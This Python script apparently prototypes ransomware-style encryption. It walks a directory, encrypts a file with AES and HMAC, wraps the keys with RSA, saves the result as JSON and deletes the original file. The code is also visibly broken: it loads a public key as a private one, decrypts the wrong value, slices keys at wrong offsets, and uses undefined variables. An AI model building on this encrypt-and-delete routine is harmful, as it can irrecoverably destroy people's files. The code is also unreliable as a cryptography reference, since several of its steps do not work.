import os
import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import (padding, hashes, hmac, serialization)

fileToEncrypt = 'image.jpg'
root = "/TestFiles"
path = os.path.join(root, "targetdirectory")

def FindFiles(root, path):
    # Search through directory
    for path, subdirs, files in os.walk(root):
        for name in files:
            print(os.path.join(path, name))
    return 0

def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
    # Encrypt the file
    C, tag, IV, key, ext, hkey = MyFileEncrypt(filepath)
    # Load the public key from file
    public_key = serialization.load_pem_private_key(RSA_Publickey_filepath.read(),password = None,backend = default_backend())
    # Use the RSA Public Key to encrypt the key and HMAC key
    RSACipher = public_key.encrypt((key+hkey), padding.OAEP(mgf = padding.MGF1(algorithm=hashes.SHA256()),algorithm = hashes.SHA256(),label = None))
    # Return the encrypted Key and HMACKey as well as the other information needed for decryption
    return RSACipher, C, IV, tag, ext

def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
    # Get the plaintext from the RSACipher
    RSAPlain = RSA_Privatekey_filepath.decrypt(C,padding.OAEP(mgf = padding.MGF1(algorithm=hashes.SHA256()),algorithm = hashes.SHA256(),label = None))
    # Separate the Key and HMACKeys
    key = RSAPlain[0:255]
    hkey = RSAPlain[256:len(RSAPlain)]
    # Decrypt the ciphertext using the keys
    message = MyDecrypt(C, key, IV, tag, hkey)
    # Display Message
    print(message) ### CHANGE THIS LINE TO RETURN A FILE INSTEAD OF PRINTING THE MESSAGE ###

    return 0

FindFiles(root, path)

def MyEncryptMac(message, EncKey, HMACKey):
    padder = padding.PKCS7(128).padder()
    paddedToEncrypt = padder.update(message)
    paddedToEncrypt += padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(EncKey), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    #buffer = bytearray((len(message) + 32 -1 ))
    #encrypted = encryptor.update_into(paddedToEncrypt, buffer)
    cipherText = (encryptor.update(paddedToEncrypt) + encryptor.finalize())
    # Create tag object
    t = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    # Create tag from ciphertext
    t.update(cipherText)
    # Get the tag as bytes
    tag = t.finalize()
    return cipherText, iv, tag

def MyFileDecrypt(filename):
    # Decrypt the file
    decryptThis = open(fileName, "r")
    fileContents = decryptThis.read()
    jsonUndone = json.loads(fileContents)

    citBytes = jsonUndone["cipherText"].encode('ISO-8859-1')
    key = jsonUndone["key"].encode('ISO-8859-1')
    iv = jsonUndone["iv"].encode('ISO-8859-1')
    tag = jsonUndone["tag"].encode('ISO-8859-1')
    HMACKey = jsonUndone["HMACKey"].encode('ISO-8859-1')
    ext = jsonUndone["extension"]
    print(type(HMACKey))

    print("HMACKEY After: ", HMACKey)

    message = MyDecrypt(citBytes, key, iv, tag, HMACKey)
    return message, ext

def MyDecrypt(cipherText, key, iv, tag, HMACKey):
    # Create a tag from the ciphertext
    tag2 = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    tag2.update(cipherText)
    try:
        # Verify that the cipherText tag that was generated matches the tag that was created for the original message
        tag2.verify(tag)
        print("The file is unmodified, the MACs match")
    except:
        # The tags did not match, the file has been modified
        print("The file has been modified, the MACs do not match.")
        quit()

    # The tags matched, continue with decryption
    # Create the cipher
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    # Create a decryptor
    decryptor = cipher.decryptor()
    # Pass the ciphertext through the decryptor and get all of the data out of the decryptor using finalize
    string = decryptor.update(cipherText) + decryptor.finalize()
    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    unpadded = unpadder.update(string)
    unpadded += unpadder.finalize()

    # Return unpadded message
    return unpadded

def MyFileEncrypt(filepath):
    ext = getExtension(filepath)
    file = open(filepath, "rb")
    fileBytes = file.read()
    key = os.urandom(16)
    hkey = os.urandom(16)
    cipherText, iv, tag = MyEncryptMac(fileBytes, key, hkey)
    return cipherText, tag, iv, key, ext, hkey

def getExtension(filepath):
    return os.path.splitext(filepath)[1]

def createJSON(cit, tag, iv, ext, RSACipher):
    jsonData = {}
    jsonData['cipherText'] = cit.decode('ISO-8859-1')
    jsonData['tag'] = tag.decode('ISO-8859-1')
    jsonData['iv'] = iv.decode('ISO-8859-1')
    jsonData['RSACipher'] = RSACipher.decode('ISO-8859-1')
    jsonData['extension'] = ext
    return json.dumps(jsonData)

def createFile(fileName, jsonObj):
    f = open(fileName, "w")
    f.write(jsonObj)
    f.close()



## TESTING FUNCTIONS HERE ##
# Encrypt the file contents

#cit, tag, iv, key, ext, hkey = MyFileEncrypt(fileToEncrypt)

################################################################
# This line of code needs the filepath to the public key to work
#RSACipher, cit, iv, tag, ext = MyRSAEncrypt(fileToEncrypt, getPublicKeyFilePath())
################################################################

# Create and dump the JSON data into the object
jsonObj = createJSON(cit, tag, iv, ext, RSACipher)
# Delete original file
os.remove(fileToEncrypt)
# Create encrypted json file named the same as the original file with different extension
fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
createFile(fileName, jsonObj)
